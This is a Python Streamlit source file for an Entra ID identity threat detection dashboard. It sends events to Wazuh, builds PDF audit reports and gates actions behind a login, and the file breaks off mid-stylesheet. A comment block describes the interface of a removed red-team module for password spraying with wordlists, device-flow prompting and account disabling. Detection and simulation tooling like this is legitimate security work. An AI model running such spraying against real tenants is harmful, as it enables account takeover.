import streamlit as st
import pandas as pd
import requests
import time
import io
import json
import os
import hmac
import hashlib
import warnings
from pathlib import Path
from datetime import datetime
import plotly.express as px

# ReportLab Imports for PDF Generation
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable

from modules import config, storage, integrations
from modules.db import is_configured as db_is_configured
from modules.ai_generator import AIServiceSwitcher, row_to_entra_log

# --- ATTACK ENGINE İNTEQRASİYASI ---
# QEYD (Faza 5, 2026-10-05): `modules/attack_engine.py` working tree-dən
# silinib (bax CLAUDE.md, "Açıq" bəndləri). Bu blok TOXUNULMADAN saxlanılıb
# ki, fayl geri qoyulanda qalan kod (Red Team Attack Controller tab-ı)
# DƏYİŞİKLİK TƏLƏB ETMƏSİN. Geri qoyulan fayl aşağıdakı KONTRAKTA uyğun
# olmalıdır:
#
#   modules/attack_engine.py gözlənilən məzmun:
#     - USERS_FILE, PASSWORDS_FILE: str (wordlist fayl yolları)
#     - generate_wordlists() -> dict:
#         {"graph_fetch_ok": bool, "real_user_count": int,
#          "user_source": str, "graph_fetch_detail": str}
#     - class IdentityAttackEngine(users_file, passwords_file):
#         .users: list[str]
#         .passwords: list[str]
#         .public_app: MSAL PublicClientApplication-uyğun obyekt —
#             .acquire_token_by_username_password(username, password, scopes) -> dict
#             .initiate_device_flow(scopes) -> dict (uğurlu olduqda 'user_code' açarı olmalıdır)
#         .revoke_sign_in_sessions(username) -> tuple[bool, str]
#         .disable_account(username) -> tuple[bool, str]
#
# Fayl mövcud olmadıqda / kontrakta uyğun olmadıqda `attack_engine = None`
# qalır, Red Team tab-ı bunu aşkarlayıb bütün hücum düymələrini disable
# edir və aydın diaqnoz göstərir — tətbiq ÇÖKMÜR.
attack_engine = None
attack_engine_error = None
wordlist_info = None
try:
    from modules.attack_engine import IdentityAttackEngine, USERS_FILE, PASSWORDS_FILE, generate_wordlists

    wordlist_info = generate_wordlists()
    attack_engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)

    # Müdafiəedici yoxlama: fayl geri qoyulanda kontrakta tam uyğun
    # olmaya bilər (məs. metod adı fərqli yazılıb). Bunu İNDİ aşkarlayıb
    # aydın mesaj vermək, bir hücum düyməsi basılanda dərində gizli
    # AttributeError almaqdan DAHA YAXŞIDIR.
    _required_attack_engine_attrs = ["users", "passwords", "public_app", "revoke_sign_in_sessions", "disable_account"]
    _missing_attack_engine_attrs = [a for a in _required_attack_engine_attrs if not hasattr(attack_engine, a)]
    if _missing_attack_engine_attrs:
        raise RuntimeError(
            "IdentityAttackEngine gözlənilən interfeysə uyğun deyil, əskik: "
            + ", ".join(_missing_attack_engine_attrs)
        )
except ImportError as e:
    attack_engine = None
    attack_engine_error = f"Modul import xətası: {e}"
except RuntimeError as e:
    attack_engine = None
    attack_engine_error = str(e)
except Exception as e:
    attack_engine = None
    attack_engine_error = f"Gözlənilməz xəta: {e}"
# --------------------------------------------------------

st.set_page_config(
    page_title="Argus ITDR - Identity Threat Detection",
    page_icon="🛡️",
    layout="wide"
)

if not config.WAZUH_VERIFY_SSL:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ----------------------------------------------------------------------
# Argus -> Wazuh manager lokal fayl körpüsü
# ----------------------------------------------------------------------
_ARGUS_LOG_FILE = Path(config.ARGUS_LOG_DIR) / config.ARGUS_LOG_FILENAME


def send_to_wazuh(payload):
    """
    KÖK SƏBƏB DÜZƏLİŞİ (Cloud <-> ev şəbəkəsi): Cloud-da işləyən Streamlit
    tətbiqi sizin ev kompüterinizin fayl sisteminə birbaşa yaza BİLMƏZ —
    bu, iki tamam ayrı maşındır. Əvvəlki versiya ARGUS_LOG_DIR-ə "yazır" və
    "uğurlu" qaytarırdı, amma bu fayl Cloud-un öz ötəri konteynerində
    yaranıb yox olurdu, Wazuh manager-ə heç vaxt çatmırdı.

    İndi iki rejim var:
      1) ARGUS_INGEST_URL təyin olunubsa (Cloud + ev arasında "ingest
         bridge" qurulub — bax receiver.py) -> hadisə HTTP POST ilə bu
         URL-ə göndərilir. Bridge onu evinizdə lokal fayla yazır.
      2) ARGUS_INGEST_URL boşdursa (tətbiq Wazuh ilə EYNİ maşında
         işləyir) -> köhnə davranış: birbaşa lokal fayla yazılır.

    QEYD (Faza 4, 2026-10-05): URL/token indi həm `.env`-dən, həm də
    ⚙️ Integrations tab-ında UI-dan təyin oluna bilər (bax:
    modules/integrations.py). UI konfiqurasiya edilməyibsə, davranış
    DƏYİŞMƏDƏN əvvəlki kimidir (yalnız `.env`).

    Qaytarır: (ok: bool, data: dict | str-xəta-mesajı)
    """
    _wazuh_cfg = integrations.get_active_wazuh_config()
    ingest_url = _wazuh_cfg["ingest_url"]
    ingest_token = _wazuh_cfg["ingest_token"]

    if ingest_url:
        try:
            headers = {
                "Content-Type": "application/json",
                # ngrok pulsuz planın HTML interstitial səhifəsini bypass edir —
                # bu olmadan cavab HTML olur və JSON parse xətası yaranır.
                "ngrok-skip-browser-warning": "true",
            }
            if ingest_token:
                headers["X-Argus-Token"] = ingest_token

            resp = requests.post(
                ingest_url,
                headers=headers,
                json=payload,
                timeout=15,
            )
            if resp.status_code in (200, 201):
                try:
                    return True, resp.json()
                except Exception:
                    return True, {"written": True}
            return False, f"HTTP {resp.status_code}: {resp.text[:300]}"
        except Exception as e:
            return False, f"Ingest bridge bağlantı xətası: {e}"

    # Fallback: eyni maşında lokal fayla yazmaq (Wazuh manager elə bu
    # kompüterdə işləyirsə, ARGUS_INGEST_URL boş saxlanılıb).
    try:
        _ARGUS_LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
        with open(_ARGUS_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(payload, ensure_ascii=False) + "\n")
        return True, {"written": True, "file": str(_ARGUS_LOG_FILE)}
    except Exception as e:
        return False, str(e)


def detect_columns(df: pd.DataFrame) -> dict:
    def pick(*candidates):
        for c in candidates:
            if c in df.columns:
                return c
        return None

    return {
        "event": pick("EventID", "event_id"),
        "user": pick("TargetUserName", "user", "TargetUser"),
        "ip": pick("IpAddress", "source_ip", "IP"),
    }


def classify_risk(event_value) -> str:
    val = str(event_value)
    if "4624" in val:
        return "COMPROMISED"
    if "4625" in val:
        return "ATTEMPTED"
    return "UNKNOWN"


def event_matches(series: pd.Series, code) -> pd.Series:
    return series.astype(str).str.contains(str(code), na=False)


def ensure_timestamp_column(df: pd.DataFrame) -> pd.DataFrame:
    if df is None or df.empty:
        return df

    display_df = df.copy()

    if "Timestamp" not in display_df.columns:
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        display_df.insert(0, "Timestamp", now_str)
    else:
        def _fmt(v):
            try:
                return pd.to_datetime(v).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                return v

        display_df["Timestamp"] = display_df["Timestamp"].apply(_fmt)
        cols_order = ["Timestamp"] + [c for c in display_df.columns if c != "Timestamp"]
        display_df = display_df[cols_order]

    # KÖK SƏBƏB DÜZƏLİŞİ (pyarrow.lib.ArrowInvalid): EventID kimi sütunlar
    # mənbəyə görə qarışıq tipli olur — Red Team Attack Controller-in
    # yaratdığı hadisələrdə EventID int (4625), CSV-dən yüklənən köhnə
    # sətirlərdə isə str ("4625") olur. pd.concat bunları "object" tipinə
    # salır, qarışıq elementlərlə — Streamlit-in Arrow serializasiyası bunu
    # emal edə bilmir və bütün cədvəl göstərilməyə çalışanda crash edir.
    # Göstərim MƏQSƏDİ ilə bütün sütunları string-ə çeviririk (backend/
    # session_state-dəki əsl data dəyişmir, çünki bu, hələ də bir KOPYA
    # üzərində aparılır).
    display_df = display_df.astype(str)

    return display_df


# PDF Generation Function
def generate_pdf_report(df, resolved_users, posture_score):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(
        buffer,
        pagesize=letter,
        rightMargin=36,
        leftMargin=36,
        topMargin=36,
        bottomMargin=36
    )

    styles = getSampleStyleSheet()

    title_style = ParagraphStyle(
        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold',
        fontSize=20, textColor=colors.HexColor("#0E1117"), spaceAfter=6
    )
    subtitle_style = ParagraphStyle(
        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica',
        fontSize=10, textColor=colors.HexColor("#555555"), spaceAfter=15
    )
    h2_style = ParagraphStyle(
        'SectionHeader', parent=styles['Heading2'], fontName='Helvetica-Bold',
        fontSize=14, textColor=colors.HexColor("#1F77B4"), spaceBefore=12, spaceAfter=8
    )
    body_style = ParagraphStyle(
        'BodyDark', parent=styles['Normal'], fontName='Helvetica',
        fontSize=9, textColor=colors.HexColor("#222222")
    )

    elements = []

    elements.append(Paragraph("🛡️ ARGUS ITDR - EXECUTIVE SECURITY AUDIT REPORT", title_style))
    elements.append(Paragraph(
        f"<b>Generated:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')} | "
        f"<b>Engine:</b> Argus Security Analytics Platform", subtitle_style))
    elements.append(HRFlowable(width="100%", thickness=1.5, color=colors.HexColor("#1F77B4"), spaceAfter=15))

    cols = detect_columns(df)
    event_col = cols["event"]
    user_col = cols["user"] or "TargetUserName"
    ip_col = cols["ip"] or "IpAddress"

    total_events = len(df)
    failed_attempts = len(df[df[event_col].astype(str).str.contains('4625')]) if event_col else total_events
    compromised_attempts = len(df[df[event_col].astype(str).str.contains('4624')]) if event_col else 0
    remediated_count = len(resolved_users)

    summary_data = [
        [Paragraph("<b>Metric</b>", body_style), Paragraph("<b>Value</b>", body_style), Paragraph("<b>Status / Context</b>", body_style)],
        [Paragraph("Security Posture Score", body_style), Paragraph(f"<b>{posture_score} / 100</b>", body_style), Paragraph("Evaluated via Real-time Risk Engine", body_style)],
        [Paragraph("Total Ingested Events", body_style), Paragraph(str(total_events), body_style), Paragraph("Active Directory / Entra ID Telemetry", body_style)],
        [Paragraph("Failed Logon Attempts", body_style), Paragraph(str(failed_attempts), body_style), Paragraph("Event ID 4625 Anomalies Detected", body_style)],
        [Paragraph("Compromised Accounts (Successful Attack Logon)", body_style), Paragraph(str(compromised_attempts), body_style), Paragraph("Event ID 4624 — Attacker Holds Valid Session", body_style)],
        [Paragraph("Threats Remediated", body_style), Paragraph(str(remediated_count), body_style), Paragraph("Conditional Access & Token Revocation", body_style)]
    ]

    summary_table = Table(summary_data, colWidths=[180, 100, 260])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#EAEAEA")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.black),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 6),
        ('TOPPADDING', (0, 0), (-1, -1), 6),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#DDDDDD")),
    ]))

    elements.append(Paragraph("1. Executive Summary", h2_style))
    elements.append(summary_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("2. Threat Analysis & Remediation Log", h2_style))

    pdf_display_df = ensure_timestamp_column(df) if not df.empty else df

    table_data = [[
        Paragraph("<b>Timestamp</b>", body_style),
        Paragraph("<b>Target User</b>", body_style),
        Paragraph("<b>Attacker IP</b>", body_style),
        Paragraph("<b>Error Code</b>", body_style),
        Paragraph("<b>Method</b>", body_style),
        Paragraph("<b>Remediation Status</b>", body_style)
    ]]

    if not pdf_display_df.empty:
        for idx, row in pdf_display_df.iterrows():
            ts = str(row.get("Timestamp", ""))
            user = str(row.get(user_col, "Unknown"))
            ip = str(row.get(ip_col, "127.0.0.1"))
            err = str(row.get("ErrorCode", "AADSTS50126"))
            method = str(row.get("AuthMethod", "OAuth2/NTLM"))

            is_blocked = user in resolved_users
            status_text = "<b><font color='#28A745'>REMEDIATED (Blocked)</font></b>" if is_blocked else "<b><font color='#DC3545'>ACTIVE THREAT</font></b>"

            table_data.append([
                Paragraph(ts, body_style),
                Paragraph(user, body_style),
                Paragraph(ip, body_style),
                Paragraph(err, body_style),
                Paragraph(method, body_style),
                Paragraph(status_text, body_style)
            ])

    threat_table = Table(table_data, colWidths=[85, 95, 85, 75, 75, 125])
    threat_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor("#1F77B4")),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
        ('TOPPADDING', (0, 0), (-1, -1), 5),
        ('GRID', (0, 0), (-1, -1), 0.5, colors.HexColor("#CCCCCC")),
    ]))

    elements.append(threat_table)
    elements.append(Spacer(1, 15))

    elements.append(Paragraph("3. Hardening & Strategic Recommendations", h2_style))
    recs = [
        "<b>Enforce Phishing-Resistant MFA:</b> Upgrade identity scopes to require FIDO2 Security Keys or Certificate-Based Authentication.",
        "<b>Deploy Entra ID Protection Policies:</b> Enable automated Smart Lockout thresholds to block password spray IP pools dynamically.",
        "<b>Continuous SIEM Dispatch:</b> Ensure all failed authentication spikes are streaming live into Wazuh Indexer for active SOAR triage.",
        "<b>Session Invalidation:</b> Automatically revoke Active Refresh Tokens for any user accumulating >3 failed sign-ins within 60 seconds.",
        "<b>Compromised Account Priority:</b> Any account with a successful logon (4624) during an active attack window must be treated as CRITICAL and remediated before failed-attempt-only accounts."
    ]
    for r in recs:
        elements.append(Paragraph(f"• {r}", body_style))
        elements.append(Spacer(1, 4))

    doc.build(elements)
    buffer.seek(0)
    return buffer


# ========================================================================
# 🔐 AUTHENTICATION LAYER
# ========================================================================
ARGUS_ADMIN_USER = os.getenv("ARGUS_ADMIN_USER", "")
ARGUS_ADMIN_HASH = os.getenv("ARGUS_ADMIN_HASH", "")

MAX_LOGIN_ATTEMPTS = 3
LOCKOUT_SECONDS = 30


def _hash_password(password: str) -> str:
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def _verify_credentials(username: str, password: str) -> bool:
    if not ARGUS_ADMIN_USER or not ARGUS_ADMIN_HASH:
        return False
    entered_hash = _hash_password(password)
    user_ok = hmac.compare_digest(username.strip().encode("utf-8"), ARGUS_ADMIN_USER.strip().encode("utf-8"))
    hash_ok = hmac.compare_digest(entered_hash.encode("utf-8"), ARGUS_ADMIN_HASH.strip().encode("utf-8"))
    return user_ok and hash_ok


def _log_login_event(event_type: str, username: str):
    payload = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "event_type": event_type,
        "user": username or "unknown",
        "source": "Argus-UI-Auth",
        "severity": "INFO" if event_type == "UI_LOGIN_SUCCESS" else "HIGH",
        "rule_title": "Argus ITDR Panel Authentication Event",
    }
    try:
        send_to_wazuh(payload)
    except Exception:
        pass


def _init_auth_state():
    st.session_state.setdefault("authenticated", False)
    st.session_state.setdefault("auth_username", None)
    st.session_state.setdefault("login_attempts", 0)
    st.session_state.setdefault("lockout_until", 0.0)


def render_landing_page():
    """Login tələb etməyən ictimai giriş səhifəsi (`?page=landing`, default route).

    MVP marketinq-tipli hero + xüsusiyyət kartları. Buradan ya birbaşa
    tətbiqə (sərbəst naviqasiya, login olmadan baxış) ya da login
    səhifəsinə keçid olunur.
    """
    st.markdown(
        """
        <style>
        .stApp {
            background: radial-gradient(circle at top, #111827 0%, #05070c 68%);
        }
        .argus-hero {
            text-align: center;
            padding: 3.5rem 1rem 2rem 1rem;
        }
        .argus-hero-badge {
            display: inline-block;
            padding: 0.25rem 0.75rem;
            font-size: 0.75rem;
            font-weight: 700;
            letter-spacing: 0.6px;
            color: #34d399;
            background: rgba(52, 211, 153, 0.12);
            border: 1px solid rgba(52, 211, 153, 0.35);
            border-radius: 999px;
            margin-bottom: 1.1rem;
        }
        .argus-hero-title {
            font-size: 2.6rem;
            font-weight: 800;
            color: #e5e7eb;
            line-height: 1.15;
            margin-bottom: 0.7rem;
        }
        .argus-hero-subtitle {
            font-size: 1.05rem;
            color: #8a97ad;
            max-width: 640px;
            margin: 0 auto 2rem auto;
            line-height: 1.55;
        }
        .argus-feature-card {
            background: #0e1420;
            border: 1px solid #1f2937;
            border-radius: 14px;
            padding: 1.4rem 1.3rem;
            height: 100%;
        }
        .argus-feature-icon { font-size: 1.6rem; margin-bottom: 0.5rem; }
        .argus-feature-title {
            font-size: 1rem;
            font-weight: 700;
            color: #e5e7eb;
            margin-bottom: 0.35rem;
        }
        .argus-feature-desc {
            font-size: 0.85rem;
            color: #7d8aa0;
            line-height: 1.45;
        }
        </style>
        """,
        unsafe_allow_html=True,
    )

    st.markdown(
        """
        <div class="argus-hero">
            <div class="argus-hero-badge">● SOC ACTIVE</div>
            <div class="argus-hero-title">🛡️ Argus ITDR</div>
            <div class="argus-hero-subtitle">
                Microsoft Entra ID üçün avtonom, AI əsaslı Identity Threat
                Detection &amp; Response platforması. Hücumları canlı izləyin,
                AI ilə Sigma qaydası generasiya edin, Wazuh SIEM-ə inteqrasiya
                edin — hamısı bir panel üzərindən.
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )

    col_l, col_cta1, col_cta2, col_r = st.columns([2, 1.3, 1.3, 2])
    with col_cta1:
        if st.button("🚀 Tətbiqə keç", use_container_width=True, type="primary", key="landing_cta_app"):
            st.query_params["page"] = "app"
            st.rerun()
    with col_cta2:
        if st.button("🔐 Daxil ol", use_container_width=True, key="landing_cta_login"):
            st.query_params["page"] = "login"
            st.rerun()

    st.caption(
        "<div style='text-align:center; color:#5b6579; font-size:0.8rem; margin-top:0.3rem;'>"
        "Tətbiqə baxmaq üçün giriş tələb olunmur — yalnız hücum/remediation/SIEM əməliyyatları üçün daxil olmalısınız."
        "</div>",
        unsafe_allow_html=True,
    )

    st.markdown("<div style='margin-top:2.5rem;'></div>", unsafe_allow_html=True)

    features = [
        ("📥", "Real-time Log Ingestion", "Entra ID sign-in log-larını (CSV və ya canlı) yükləyin, avtomatik risk təsnifatı alın."),
        ("🤖", "AI Threat Analysis & Auto-Fix", "AI ilə Sigma qaydası generasiyası və remediation tövsiyələri — bir kliklə icra."),
        ("⚔️", "Red Team Attack Controller", "MSAL/Graph əsaslı real hücum simulyasiyaları (brute force, spray, MFA fatigue)."),
        ("⚙️", "SIEM Integration", "Wazuh və digər SIEM-lərə canlı dispatch — tam audit-trail ilə."),
    ]
    cols = st.columns(4)
    for col, (icon, title, desc) in zip(cols, features):
        with col:
            st.markdown(
                f"""
                <div class="argus-feature-card">
                    <div class="argus-feature-icon">{icon}</div>
                    <div class="argus-feature-title">{title}</div>
                    <div class="argus-feature-desc">{desc}</div>
                </div>
                """,
                unsafe_allow_html=True,
            )

    st.markdown("<div style='margin-top:2.8rem;'></div>", unsafe_allow_html=True)
    st.markdown(
        "<div style='text-align:center; font-size:1.1rem; font-weight:700; color:#e5e7eb; margin-bottom:1.1rem;'>"
        "Necə işləyir?</div>",
        unsafe_allow_html=True,
    )
    steps = [
        ("1", "Qeydiyyatsız bax", "Bütün panellərə (Dashboard, Analytics, Audit Report və s.) sərbəst gəzin — giriş tələb olunmur."),
        ("2", "Lazım olanda daxil ol", "Yalnız hücum/remediation/SIEM kimi real əməliyyat icra edəndə login formu açılır."),
        ("3", "Əməliyyatı icra et", "Daxil olduqdan sonra bütün funksiyalar (Red Team, Auto-Fix, Wazuh dispatch) açılır."),
    ]
    step_cols = st.columns(3)
    for col, (num, title, desc) in zip(step_cols, steps):
        with col:
            st.markdown(
                f"""
                <div class="argus-feature-card" style="text-align:center;">
                    <div style="font-size:1.3rem; font-weight:800; color:#34d399; margin-bottom:0.3rem;">{num}</div>
                    <div class="argus-feature-title">{title}</div>
                    <div class="argus-feature-desc">{desc}</div>
                </div>
                """,
                unsafe_allow_html=True,
            )


def require_login(key: str, message: str = None) -> bool:
    """Funksional (data-dəyişən / xarici sistemə göndərən) əməliyyatlar
    üçün login qapısı. Səhifələrin özü AÇIQDIR (login tələb olunmur) —
    yalnız bu funksiyanın çağırıldığı KONKRET əməliyyat (düymə) login
    tələb edir. Login olunmayıbsa xəbərdarlıq + 'Daxil ol' düyməsi
    göstərir (login səhifəsinə yönləndirir) və False qaytarır.
    """
    if st.session_state.get("authenticated"):
        return True
    st.warning(message or "🔐 Bu əməliyyatı icra etmək üçün daxil olmalısınız.")
    if st.button("🔓 Daxil ol", key=f"login_gate_{key}"):
        st.query_params["page"] = "login"
        st.rerun()
    return False


def render_login_page():
    st.markdown(
        """
        <style>
        .stApp {
            background: radial-gradient(circle at top, #111827 0%, #05070c 68%);
        }
        [data-testid="stForm"] {
            background: #0e1420;
            border: 1px solid #1f2937;
            border-radius: 14px;
            padding: 2.2rem 2.4rem 1.6rem 2.4rem;
            box-shadow: 0 0 40px rgba(0, 180, 255, 0.07);
        }
        .argus-login-title {
            font-size: 1.75rem;
            font-weight: 800;
            color: #e5e7eb;
            margin-bottom: 0.15rem;
        }
        .argus-login-subtitle {
            font-size: 0.87rem;
            color: #7d8aa0;
            margin-bottom: 1.5rem;
            line-height: 1.4;
        }
        </style>
        """,
        unsafe_allow_html=True,
    )

    col_l, col_center, col_r = st.columns([1, 1.15, 1])
    with col_center:
        if st.button("⬅ Ana səhifə", key="login_back_to_landing"):
            st.query_params["page"] = "landing"
            st.rerun()
        st.markdown('<div class="argus-login-title">🛡️ Argus ITDR Platform Login</div>', unsafe_allow_html=True)
        st.markdown(
            '<div class="argus-login-subtitle">Identity Threat Detection &amp; Response — Restricted Access.<br>'
            'Bütün giriş cəhdləri audit log-a yazılır.</div>',
            unsafe_allow_html=True,
        )

        now = time.time()
        lockout_remaining = st.session_state["lockout_until"] - now

        if lockout_remaining > 0:
            st.error(
                f"🔒 Həddindən artıq yanlış cəhd səbəbindən müvəqqəti bloklanıb. "
                f"Yenidən cəhd etmək üçün **{int(lockout_remaining) + 1} saniyə** gözləyin."
            )
            st.button("🔄 Yenilə")
            return

        if not ARGUS_ADMIN_USER or not ARGUS_ADMIN_HASH:
            st.warning(
                "⚠️ `.env` faylında `ARGUS_ADMIN_USER` və/ya `ARGUS_ADMIN_HASH` təyin olunmayıb — "
                "giriş mümkün deyil. Aşağıdakı dəyişənləri doldurun və tətbiqi yenidən başladın."
            )

        with st.form("login_form", clear_on_submit=False):
            username_input = st.text_input("👤 İstifadəçi adı", value="", key="login_username_field")
            password_input = st.text_input("🔑 Şifrə", value="", type="password", key="login_password_field")
            submitted = st.form_submit_button("🔓 Daxil ol", use_container_width=True)

            if submitted:
                if _verify_credentials(username_input, password_input):
                    st.session_state["authenticated"] = True
                    st.session_state["auth_username"] = username_input.strip()
                    st.session_state["login_attempts"] = 0
                    st.session_state["lockout_until"] = 0.0
                    _log_login_event("UI_LOGIN_SUCCESS", username_input.strip())
                    st.query_params["page"] = "app"
                    st.rerun()
                else:
                    st.session_state["login_attempts"] += 1
                    _log_login_event("UI_LOGIN_FAILED", username_input.strip() or "unknown")

                    remaining = MAX_LOGIN_ATTEMPTS - st.session_state["login_attempts"]
                    if remaining <= 0:
                        st.session_state["lockout_until"] = time.time() + LOCKOUT_SECONDS
                        st.session_state["login_attempts"] = 0
                        _log_login_event("UI_LOGIN_LOCKOUT", username_input.strip() or "unknown")
                        st.error(f"🔒 3 ardıcıl yanlış cəhd aşkarlandı. {LOCKOUT_SECONDS} saniyəlik bloklama aktivləşdi.")
                        st.rerun()
                    else:
                        st.error(f"❌ Yanlış istifadəçi adı və ya şifrə. Qalan cəhd: {remaining}")

        st.caption("🔐 SHA-256 hash-based authentication · Rate-limited · Audit-logged to Argus log bridge")


def render_account_sidebar():
    """Sidebar-ın aşağı hissəsi. SƏRBƏST NAVİQASİYA MODELİ: istifadəçi
    login olmadan da burada görünür (qonaq rejimi) — login yalnız
    `require_login()` çağırılan konkret əməliyyatlarda tələb olunur.
    """
    with st.sidebar:
        st.markdown("---")
        if st.session_state.get("authenticated"):
            st.markdown(f"👤 **{st.session_state.get('auth_username') or 'Admin'}**")
            st.caption("🟢 Authenticated Session")
            if st.button("🚪 Çıxış Et (Logout)", use_container_width=True, key="sidebar_logout_btn"):
                _log_login_event("UI_LOGOUT", st.session_state.get("auth_username", "unknown"))
                st.session_state["authenticated"] = False
                st.session_state["auth_username"] = None
                st.rerun()
        else:
            st.caption("🔓 Qonaq rejimi — baxış sərbəstdir, əməliyyatlar üçün daxil olun.")
            if st.button("🔐 Daxil ol", use_container_width=True, key="sidebar_login_btn"):
                st.query_params["page"] = "login"
                st.rerun()
        if st.button("🏠 Ana səhifə", use_container_width=True, key="sidebar_landing_btn"):
            st.query_params["page"] = "landing"
            st.rerun()


_AI_CHAT_SYSTEM_PROMPT = (
    "Sən Argus ITDR platformasının sidebar-dakı AI Köməkçisisən. Platforma "
    "Microsoft Entra ID üçün identity threat detection & response (ITDR) "
    "təklif edir: hadisə analizi, risk skorlaması, Sigma qaydası generasiyası, "
    "Red Team hücum simulyasiyası, Wazuh SIEM inteqrasiyası. SOC analitikinə "
    "qısa, dəqiq, praktiki cavablar ver (Azərbaycan dilində, istifadəçi başqa "
    "dildə yazmayıbsa). Həssas məlumat (şifrə, token, API key) heç vaxt istəmə "
    "və təkrar etmə."
)


def render_ai_chatbot_sidebar():
    """Səhifənin qırağında (sidebar) sabit AI Köməkçi paneli.

    `.env`-dəki `AI_MODE` (məs. "groq") ilə işləyir — eyni `AIServiceSwitcher`
    (bax modules/ai_generator.py), yalnız Sigma qaydası yox, sərbəst söhbət
    üçün `chat()` metodu çağırılır. Xarici API çağırdığı üçün FUNKSİONAL
    əməliyyat sayılır -> `require_login()` ilə eyni Faza 2+3 modelinə görə
    qorunur (baxış yox, bu panel bütünlüklə login tələb edir).
    """
    with st.sidebar:
        st.markdown("---")
        with st.expander("🤖 AI Köməkçi", expanded=False):
            if not st.session_state.get("authenticated"):
                st.caption("🔐 AI Köməkçidən istifadə üçün daxil olmalısınız.")
                if st.button("🔓 Daxil ol", use_container_width=True, key="login_gate_ai_chat"):
                    st.query_params["page"] = "login"
                    st.rerun()
                return

            st.session_state.setdefault("ai_chat_history", [])

            for msg in st.session_state["ai_chat_history"]:
                with st.chat_message(msg["role"]):
                    st.markdown(msg["content"])

            user_msg = st.chat_input("Sualını yaz...", key="ai_chat_input")
            if user_msg:
                st.session_state["ai_chat_history"].append({"role": "user", "content": user_msg})
                try:
                    engine_ai = AIServiceSwitcher()
                    ok, reply = engine_ai.chat(st.session_state["ai_chat_history"], system_prompt=_AI_CHAT_SYSTEM_PROMPT)
                    reply_text = reply if ok else f"⚠️ {reply}"
                except Exception as e:
                    reply_text = f"⚠️ AI Köməkçi xətası: {e}"
                st.session_state["ai_chat_history"].append({"role": "assistant", "content": reply_text})
                st.rerun()

            if st.session_state["ai_chat_history"] and st.button("🗑️ Tarixçəni təmizlə", use_container_width=True, key="ai_chat_clear_btn"):
                st.session_state["ai_chat_history"] = []
                st.rerun()


# ========================================================================
# 🧭 ROUTER — Landing / Login / App
# ========================================================================
# KÖK SƏBƏB DƏYİŞİKLİYİ (2026-10-05, Faza 2+3): əvvəlki versiyada BÜTÜN
# tətbiq login arxasında idi (`st.stop()` login olmayanda). İndi:
#   - "landing" (default) -> ictimai marketinq səhifəsi, login YOXDUR.
#   - "login"             -> ayrıca login səhifəsi.
#   - "app" (və ya naməlum dəyər) -> əsas tətbiq (bütün tab-lar) LOGİN
#     OLMADAN açıqdır — sərbəst naviqasiya. Yalnız data-dəyişən/xarici
#     sistemə göndərən KONKRET əməliyyatlar (`require_login()` ilə
#     qorunan düymələr) daxil olmağı tələb edir.
_init_auth_state()

_argus_page = st.query_params.get("page", "landing")

if _argus_page == "landing":
    render_landing_page()
    st.stop()

if _argus_page == "login":
    render_login_page()
    st.stop()


# ========================================================================
# 🎨 SIDEBAR BRANDING + VERTİKAL NAVİQASİYA MENYUSU
# ========================================================================
st.markdown(
    """
    <style>
    section[data-testid="stSidebar"] {
        background: linear-gradient(180deg, #0b0f19 0%, #05070c 100%);
        border-right: 1px solid #1f2937;
    }

    .argus-sidebar-brand {
        padding: 1.1rem 0.9rem 1rem 0.9rem;
        margin: -1rem -1rem 0.6rem -1rem;
        background: radial-gradient(circle at top left, rgba(31,119,180,0.18), rgba(5,7,12,0) 70%);
        border-bottom: 1px solid #1f2937;
    }
    .argus-sidebar-brand-title {
        font-size: 1.35rem;
        font-weight: 800;
        color: #e5e7eb;
        letter-spacing: 0.3px;
        display: flex;
        align-items: center;
        gap: 0.4rem;
    }
    .argus-sidebar-brand-subtitle {
        font-size: 0.74rem;
        font-weight: 500;
        color: #7d8aa0;
        letter-spacing: 0.4px;
        text-transform: uppercase;
        margin-top: 0.15rem;
    }
    .argus-sidebar-brand-badge {
        display: inline-block;
        margin-top: 0.55rem;
        padding: 0.18rem 0.55rem;
        font-size: 0.68rem;
        font-weight: 700;
        letter-spacing: 0.5px;
        color: #34d399;
        background: rgba(52, 211, 153, 0.12);
        border: 1px solid rgba(52, 211, 153, 0.35);
        border-radius: 999px;
    }

    .argus-sidebar-menu-label {
        font-size: 0.7rem;
        font-weight: 700;
        letter-spacing: 1.2px;
        color: #5b6579;
        margin: 0.4rem 0 0.3rem 0.1rem;
        text-transform: uppercase;
    }

    section[data-testid="stSidebar"] div[role="radiogroup"] {
        gap: 0.15rem;
    }
    section[data-testid="stSidebar"] div[role="radiogroup"] label {
        padding: 0.5rem 0.6rem;
        border-radius: 8px;
        width: 100%;
        transition: background-color 0.15s ease;
    }
    section[data-testid="stSidebar"] div[role="radiogroup"] label:hover {
        background-color: rgba(31, 119, 180, 0.12);
    }
    section[data-testid="stSidebar"] div[role="radiogroup"] label p {
        color: #cbd5e1 !important;
        font-size: 0.92rem !important;
        font-weight: 500;
    }
    </style>

    <div class="argus-sidebar-brand">
